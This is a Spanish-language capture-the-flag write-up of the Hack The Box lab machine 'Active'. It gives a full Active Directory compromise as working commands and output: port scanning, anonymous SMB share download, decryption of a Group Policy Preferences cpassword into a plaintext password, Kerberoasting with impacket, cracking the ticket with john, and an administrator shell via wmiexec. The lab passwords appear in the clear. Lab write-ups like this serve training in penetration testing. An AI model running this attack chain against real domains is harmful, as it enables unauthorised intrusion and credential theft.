ip -> 10.10.10.100

Ports
-----
```console
└─$ nmap -T5 -Pn -v 10.10.10.100 # -> 53,88,139,135,389,445,464,593,636,3269,3268,5722,9389
└─$ nmap -sCV -T5 10.10.10.100 -Pn -v -p389,445,464,593,636,3269,3268,5722,9389
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site:e)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site:e)
3269/tcp open  tcpwrapped
5722/tcp open  msrpc         Microsoft Windows RPC
9389/tcp open  mc-nmf        .NET Message Framing
```

Tenemos un directorio activo por los puertos que hemos encontrado, pero lo mejor será encontrar primero algún 
usaurio para empezar.

Aunque tengamos el puerto 135 no hay mucha suerte:

```console
└─$ rpcclient -U "" 10.10.10.100 -N
rpcclient $> enumdomusers # ->  NT_STATUS_ACCESS_DENIED
```

Puerto 53
---------
El comando dig no me ha reportado ninguna informacion relevante.

Puerto 445 (SMB)
----------------

Investigando, si pone que esta Firmado (signing:True) no se podrán hacer ataques SMBrelays
```console
└─$ crackmapexec smb 10.10.10.100
SMB   10.10.10.100  445  DC  [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True)
└─$ smbclient -L //10.10.10.100/ -N
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
└─$ smbclient //10.10.10.100/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```
Nos ha creado la carpeta Active.htb con todos los recursos.

```console
└─$ tree 
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts
```
Hay un montón de cosas, pero el recurso "Groups.xml" es lo critico. Que esté este recurso significa que esto es
una copia del SYSVOL (al original no teniamos acceso pero a esto si). En este archivo está la contraseña 
encriptada del administrador del sistema, (la encriptacion es AES-256, un algoritmo muy fuerte).
El asunto esque si tenemos el hash (cpassword) en el groups.xml podemos romper dicho hash muy rapidamente con el 
cmando gpp ya que microsoft publico la clave de dicho algoritmo en 2012. 

```console
└─$ cd /Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
└─$ cat Groups.xml
(...)
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName="active.htb\SVC_TGS" # -> Para este usario
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18  # Esto es la contraseña
```
Vamos a validar este usario 
```
└─$ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStro
```

Con SMBmap puede acceder ahora con credenciales, a la user.txt 
```console
└─$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --download Users/SVC_TGS/Desktop/user.txt
```

Ahora podemos acceder al rpc porque ya tenemos creds.
```console
└─$ rpcclient 10.10.10.100 -U "SVC_TGS%GPPstillStandingStrong2k18"
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4] 
user:[Guest] rid:[0x1f5]    # -> Usuario invitado, por defecto en todos los sistemas
user:[krbtgt] rid:[0x1f6]   # -> usuario creado por el kerberos
user:[SVC_TGS] rid:[0x44f]  # -> Nuestro usaurio actual
rpcclient $> enumdomgroups
group:[Domain Admins] rid:[0x200]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
rpcclient $> querydispinfo
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: (null)
```
Nada interesante, ahora hay que probar con el puerto 88 (kerberos)

```console
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb

# Todo el hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Ticketmaster1968 (?)
└─$ impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
```




